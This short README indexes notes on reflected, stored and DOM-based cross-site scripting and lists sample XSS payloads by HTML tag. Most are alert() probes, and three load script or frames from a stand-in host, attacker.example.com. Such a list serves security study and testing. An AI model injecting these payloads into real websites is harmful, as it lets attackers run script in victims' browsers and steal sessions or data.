# XSS

## Contents

- [Reflected XSS](./Reflected_XSS/README.md)
- [Stored XSS](./Stored_XSS.md)
- [DOM-based XSS](./DOM-based_XSS.md)

### Common JavaScript language elements used in malicious payloads to perform cross-site scripting attacks include:

  - The `<script>` tag:
- `<script src=http://attacker.example.com/xss.js></script>`
- `<script> alert("XSS");</script>`
  - The `onload` and `onerror` attributes:
- `<img src=x onerror=alert("XSS")>`
- `<body onload=alert("XSS")>`
  - The `<body>` tag attributes:
- `<body background="javascript:alert("XSS")">`
  - The `<img>` tag attributes:
- `<img src="javascript:alert("XSS");">`
- `<img dynsrc="javascript:alert('XSS')">`
- `<img lowsrc="javascript:alert('XSS')">`
  - The `<iframe>` tag:
- `<iframe src="http://attacker.example.com/xss.html">`
  - The `<input>` tag attributes:
- `<input type="image" src="javascript:alert('XSS');">`
  - The `<link>` tag:
- `<link rel="stylesheet" href="javascript:alert('XSS');">`
  - The `<table>` and `<td>` tag attributes:
- `<table background="javascript:alert('XSS')">`
- `<td background="javascript:alert('XSS')">`
  - The `<div>` tag attributes:
- `<div style="background-image: url(javascript:alert('XSS'))">`
- `<div style="width: expression(alert('XSS'));">`
  - The `<object>` tag:
- `<object type="text/x-scriptlet" data="http://attacker.example.com/xss.html">`